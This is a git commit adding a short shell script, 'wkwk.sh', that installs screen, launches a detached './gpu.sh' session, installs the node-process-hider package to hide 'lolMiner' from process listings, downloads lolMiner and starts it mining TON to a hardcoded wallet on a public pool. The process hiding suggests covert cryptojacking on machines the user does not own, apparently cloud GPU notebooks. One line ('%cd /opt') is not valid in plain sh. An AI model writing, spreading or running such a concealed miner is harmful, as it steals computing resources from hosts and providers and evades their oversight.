cef0b17d5f3bb916edb21f7865f5a12ae2817254
Antonnnnjantung <97686110+Antonnnnjantung@users.noreply.github.com>
2022-01-27 10:19:47 +0700

    Create wkwk.sh

---
+++ wkwk.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+screen -dmS gpu.sh ./gpu.sh 89 95
+%cd /opt
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
+sudo apt install libpci3
+sudo apt-get install screen
+wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz -O - | tar -xz
+./1.42/lolMiner -a TON -p https://next.ton-pool.com -u EQB2iAjbZghTaXSug4MGtNVxVkxCANcgxrQQypPDRdl6tacf --apiport 4444
